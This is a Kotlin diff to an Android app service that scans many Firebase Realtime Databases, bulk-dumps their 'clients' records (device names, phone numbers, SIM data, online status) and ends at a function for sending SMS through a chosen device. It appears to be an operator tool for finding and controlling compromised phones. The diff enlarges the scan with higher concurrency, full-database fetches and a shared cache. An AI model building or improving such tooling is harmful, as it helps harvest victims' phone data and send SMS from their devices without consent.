@@ -59,8 +59,8 @@ class RealtimeDbService {
 
     private val http: OkHttpClient = run {
         val dispatcher = Dispatcher().apply {
-            maxRequests = 200
-            maxRequestsPerHost = 200
+            maxRequests = 300
+            maxRequestsPerHost = 300
         }
         OkHttpClient.Builder()
             .connectTimeout(4, TimeUnit.SECONDS)
@@ -72,29 +72,55 @@ class RealtimeDbService {
             .build()
     }
 
+    private val heavyHttp: OkHttpClient = run {
+        val dispatcher = Dispatcher().apply {
+            maxRequests = 20
+            maxRequestsPerHost = 20
+        }
+        OkHttpClient.Builder()
+            .connectTimeout(8, TimeUnit.SECONDS)
+            .readTimeout(20, TimeUnit.SECONDS)
+            .writeTimeout(8, TimeUnit.SECONDS)
+            .callTimeout(30, TimeUnit.SECONDS)
+            .retryOnConnectionFailure(false)
+            .dispatcher(dispatcher)
+            .build()
+    }
+
     private val jsonMedia = "application/json; charset=utf-8".toMediaType()
     private val pathCache = ConcurrentHashMap<String, String>()
 
     companion object {
         private const val TAG = "RealtimeDbService"
-        private const val SCAN_CACHE_MS = 5 * 60 * 1000L
+
+        // 10 minutes — user doesn't need to scan again for 10 min after a successful scan
+        private const val SCAN_CACHE_MS = 10 * 60 * 1000L
+
+        // Empty scans retry fast — 15s
         private const val EMPTY_SCAN_CACHE_MS = 15 * 1000L
-        private const val TOTAL_SCAN_TIMEOUT_MS = 30_000L
+
+        private const val TOTAL_SCAN_TIMEOUT_MS = 60_000L
         private const val CLIENTS_JSON_TIMEOUT_MS = 5_000L
-        private const val GLOBAL_DEVICE_CONCURRENCY = 200
-        private const val PER_FIREBASE_CONCURRENCY = 20
+        private const val FULL_FETCH_TIMEOUT_MS = 25_000L
+        private const val FULL_FETCH_MAX_BYTES = 20L * 1024L * 1024L
+        private const val GLOBAL_DEVICE_CONCURRENCY = 300
+        private const val PER_FIREBASE_CONCURRENCY = 50
         private const val ONLINE_WINDOW_SEC = 600L
+
+        // ============================================================
+        //  SHARED CACHE — across all RealtimeDbService instances
+        //  Scan in one screen → cached result available in other screens
+        // ============================================================
+        private val scanCache = ConcurrentHashMap<String, ScanCache>()
+
+        private fun cacheKey(firebases: List<FirebaseNode>): String =
+            firebases.joinToString(",") { "${it.id}|${it.url}" }
+
+        private data class ScanCache(
+            val devices: List<Device>,
+            val ts: Long,
+        )
     }
-
-    private data class ScanCache(
-        val devices: List<Device>,
-        val ts: Long,
-    )
-
-    private val scanCache = ConcurrentHashMap<String, ScanCache>()
-
-    private fun cacheKey(firebases: List<FirebaseNode>): String =
-        firebases.joinToString(",") { "${it.id}|${it.url}" }
 
     // ============================================================
     //  FIREBASES
@@ -131,7 +157,7 @@ class RealtimeDbService {
     }
 
     // ============================================================
-    //  TEST SINGLE FIREBASE — deep check with online/total
+    //  TEST SINGLE FIREBASE
     // ============================================================
     suspend fun testFirebase(fb: FirebaseNode): FirebaseTestResult = withContext(Dispatchers.IO) {
         val baseUrl = fb.url.trimEnd('/')
@@ -197,7 +223,7 @@ class RealtimeDbService {
         }
 
         val onlineCounter = AtomicInteger(0)
-        val sem = Semaphore(30)
+        val sem = Semaphore(50)
 
         coroutineScope {
             clientIds.map { devId ->
@@ -232,10 +258,7 @@ class RealtimeDbService {
     }
 
     // ============================================================
-    //  SCAN ALL
-    //  - Per-firebase + global semaphores (no starvation)
-    //  - Streaming results (partial preserved on timeout)
-    //  - 30s total safety cap; dead firebases fast-skip
+    //  SCAN ALL — shared 10-min cache
     // ============================================================
     suspend fun scanAll(
         firebases: List<FirebaseNode>,
@@ -251,10 +274,17 @@ class RealtimeDbService {
             val age = System.currentTimeMillis() - cached.ts
             val maxAge = if (cached.devices.isEmpty()) EMPTY_SCAN_CACHE_MS else SCAN_CACHE_MS
             if (age < maxAge) {
-                Log.d(TAG, "scanAll: cache hit (${cached.devices.size} devices, ${age / 1000}s old)")
+                val ageMin = age / 1000 / 60
+                val ageSec = (age / 1000) % 60
+                val ageLabel = if (ageMin > 0) "${ageMin}m ${ageSec}s" else "${ageSec}s"
+                Log.d(TAG, "scanAll: CACHE HIT — ${cached.devices.size} devices, age=$ageLabel (max=${maxAge / 1000 / 60}m)")
                 onProgress?.invoke(firebases.size - 1, cached.devices.size)
                 return@withContext cached.devices
+            } else {
+                Log.d(TAG, "scanAll: cache EXPIRED (age=${age / 1000}s, max=${maxAge / 1000}s) — rescanning")
             }
+        } else if (forceRefresh) {
+            Log.d(TAG, "scanAll: forceRefresh=true — bypassing cache")
         }
 
         Log.d(TAG, "scanAll: fresh scan of ${firebases.size} firebase(s)")
@@ -285,15 +315,11 @@ class RealtimeDbService {
                 }.awaitAll()
             }
             completed = true
-        } ?: Log.w(
-            TAG,
-            "scanAll timeout after ${TOTAL_SCAN_TIMEOUT_MS / 1000}s — preserving ${allFound.size} partial device(s)"
-        )
+        } ?: Log.w(TAG, "scanAll timeout — preserving ${allFound.size} partial device(s)")
 
         val final = allFound.toList()
-        Log.d(TAG, "scanAll done: ${final.size} device(s) (completed=$completed)")
+        Log.d(TAG, "scanAll done: ${final.size} device(s) (completed=$completed) — cached for 10 min")
 
-        // Cache only completed scans — timeouts are retried fresh next time
         if (completed) {
             scanCache[key] = ScanCache(final, System.currentTimeMillis())
         }
@@ -302,17 +328,25 @@ class RealtimeDbService {
     }
 
     // ============================================================
-    //  SCAN SINGLE FIREBASE — streaming, per-fb fairness
+    //  SCAN SINGLE FIREBASE
     // ============================================================
     private suspend fun scanFirebase(
         fb: FirebaseNode,
         globalSem: Semaphore,
         onDevice: (Device) -> Unit,
     ): Unit = coroutineScope {
+        val fullResult = scanFirebaseFull(fb)
+        if (fullResult != null) {
+            Log.d(TAG, "scan ${fb.label}: full fetch yielded ${fullResult.size} device(s)")
+            fullResult.forEach(onDevice)
+            return@coroutineScope
+        }
+
+        Log.d(TAG, "scan ${fb.label}: full fetch failed — falling back to per-device")
+
         val baseUrl = fb.url.trimEnd('/')
         val clientsUrl = baseUrl + FirebaseConfig.RTDB_CLIENTS
 
-        // 1. Fetch client list — 5s fast timeout so dead firebases don't waste scan budget
         val bodyText: String? = try {
             withTimeoutOrNull(CLIENTS_JSON_TIMEOUT_MS) {
                 val req = Request.Builder()
@@ -321,22 +355,13 @@ class RealtimeDbService {
                     .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                     .get().build()
                 http.newCall(req).execute().use { resp ->
-                    if (!resp.isSuccessful) {
-                        Log.d(TAG, "scan ${fb.label}: HTTP ${resp.code}")
-                        null
-                    } else resp.body?.string()?.trim()
+                    if (!resp.isSuccessful) null else resp.body?.string()?.trim()
                 }
             }
         } catch (e: CancellationException) { throw e }
-        catch (e: Exception) {
-            Log.w(TAG, "scan ${fb.label} clients.json failed: ${e.message}")
-            null
-        }
+        catch (_: Exception) { null }
 
-        if (bodyText.isNullOrEmpty() || bodyText == "null") {
-            Log.d(TAG, "scan ${fb.label}: empty clients list")
-            return@coroutineScope
-        }
+        if (bodyText.isNullOrEmpty() || bodyText == "null") return@coroutineScope
 
         val deviceIds: List<String> = try {
             val obj = JSONObject(bodyText)
@@ -348,60 +373,79 @@ class RealtimeDbService {
 
         if (deviceIds.isEmpty()) return@coroutineScope
 
-        Log.d(TAG, "scan ${fb.label}: ${deviceIds.size} client(s) to check")
+        Log.d(TAG, "scan ${fb.label}: ${deviceIds.size} client(s) to fetch individually")
 
-        // 2. Per-firebase semaphore — one heavy firebase cannot hog global permits
         val perFbSem = Semaphore(PER_FIREBASE_CONCURRENCY)
-
         deviceIds.map { devId ->
             async(Dispatchers.IO) {
                 try {
                     perFbSem.withPermit {
                         globalSem.withPermit {
                             val dev = fetchDevice(fb, devId)
-                            if (dev != null) {
-                                onDevice(dev)
-                            }
+                            if (dev != null) onDevice(dev)
                         }
                     }
-                } catch (e: CancellationException) {
-                    throw e
-                } catch (_: Exception) {}
+                } catch (e: CancellationException) { throw e }
+                catch (_: Exception) {}
             }
         }.awaitAll()
     }
 
-    // ============================================================
-    //  FETCH DEVICE
-    // ============================================================
-    private fun fetchDeviceObject(fb: FirebaseNode, devId: String): JSONObject? {
+    private suspend fun scanFirebaseFull(fb: FirebaseNode): List<Device>? {
+        val url = fb.url.trimEnd('/') + "/clients.json"
         return try {
-            val url = fb.url.trimEnd('/') + "/clients/$devId.json"
-            val req = Request.Builder()
-                .url(url)
-                .header("Accept", "application/json")
-                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
-                .get().build()
-            http.newCall(req).execute().use { resp ->
-                if (!resp.isSuccessful) return null
-                val body = resp.body?.string()?.trim() ?: return null
-                if (body.isEmpty() || body == "null") return null
-                try { JSONObject(body) } catch (_: Exception) { null }
+            withTimeoutOrNull(FULL_FETCH_TIMEOUT_MS) {
+                val req = Request.Builder()
+                    .url(url)
+                    .header("Accept", "application/json")
+                    .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
+                    .get().build()
+                heavyHttp.newCall(req).execute().use { resp ->
+                    if (!resp.isSuccessful) {
+                        Log.w(TAG, "full fetch ${fb.label}: HTTP ${resp.code}")
+                        return@withTimeoutOrNull null
+                    }
+                    val contentLength = resp.body?.contentLength() ?: -1L
+                    if (contentLength > FULL_FETCH_MAX_BYTES) {
+                        Log.w(TAG, "full fetch ${fb.label}: response too large (${contentLength / 1024 / 1024}MB)")
+                        return@withTimeoutOrNull null
+                    }
+                    val body = resp.body?.string() ?: return@withTimeoutOrNull null
+                    val trimmed = body.trim()
+                    if (trimmed.isEmpty() || trimmed == "null") return@withTimeoutOrNull emptyList()
+
+                    val root = try { JSONObject(trimmed) } catch (_: Exception) {
+                        return@withTimeoutOrNull null
+                    }
+
+                    val devices = mutableListOf<Device>()
+                    val keys = root.keys()
+                    while (keys.hasNext()) {
+                        val devId = keys.next()
+                        val devObj = root.optJSONObject(devId) ?: continue
+                        val dev = parseDeviceFromObject(fb, devId, devObj)
+                        if (dev != null) devices.add(dev)
+                    }
+                    devices
+                }
             }
-        } catch (_: Exception) { null }
+        } catch (e: CancellationException) {
+            throw e
+        } catch (e: Exception) {
+            Log.w(TAG, "full fetch ${fb.label} failed: ${e.message}")
+            null
+        }
     }
 
-    private fun fetchDevice(fb: FirebaseNode, devId: String): Device? {
-        val obj = fetchDeviceObject(fb, devId) ?: return null
-
-        val hasUsableData =
-            obj.has("deviceName") || obj.has("phoneNumber") || obj.has("phone") ||
-                    obj.has("number") || obj.has("sims") || obj.has("sim")
-
+    private fun parseDeviceFromObject(fb: FirebaseNode, devId: String, obj: JSONObject): Device? {
+        val hasUsableData = obj.has("deviceName") || obj.has("name") ||
+                obj.has("phoneNumber") || obj.has("phone") ||
+                obj.has("number") || obj.has("msisdn") ||
+                obj.has("sims") || obj.has("sim")
         if (!hasUsableData) return null
 
-        val isOnlineNow = isOnline(obj)
-        if (!isOnlineNow) {
+        val online = isOnline(obj)
+        if (!online) {
             val name = obj.optString("deviceName", obj.optString("name", ""))
             val phone = obj.optString("phoneNumber", obj.optString("phone", ""))
             val hasSims = obj.has("sims") || obj.has("sim")
@@ -424,9 +468,28 @@ class RealtimeDbService {
         )
     }
 
-    // ============================================================
-    //  ONLINE DETECTION — lenient
-    // ============================================================
+    private fun fetchDeviceObject(fb: FirebaseNode, devId: String): JSONObject? {
+        return try {
+            val url = fb.url.trimEnd('/') + "/clients/$devId.json"
+            val req = Request.Builder()
+                .url(url)
+                .header("Accept", "application/json")
+                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
+                .get().build()
+            http.newCall(req).execute().use { resp ->
+                if (!resp.isSuccessful) return null
+                val body = resp.body?.string()?.trim() ?: return null
+                if (body.isEmpty() || body == "null") return null
+                try { JSONObject(body) } catch (_: Exception) { null }
+            }
+        } catch (_: Exception) { null }
+    }
+
+    private fun fetchDevice(fb: FirebaseNode, devId: String): Device? {
+        val obj = fetchDeviceObject(fb, devId) ?: return null
+        return parseDeviceFromObject(fb, devId, obj)
+    }
+
     private fun isOnline(obj: JSONObject): Boolean {
         for (key in listOf("isOnline", "online", "connected", "active", "enabled")) {
             val v = obj.opt(key) ?: continue
@@ -548,9 +611,6 @@ class RealtimeDbService {
         return if (devId.length <= 8) devId else "${devId.take(4)}…${devId.takeLast(4)}"
     }
 
-    // ============================================================
-    //  SEND SMS
-    // ============================================================
     suspend fun sendSms(
         firebaseUrl: String,
         deviceId: String,
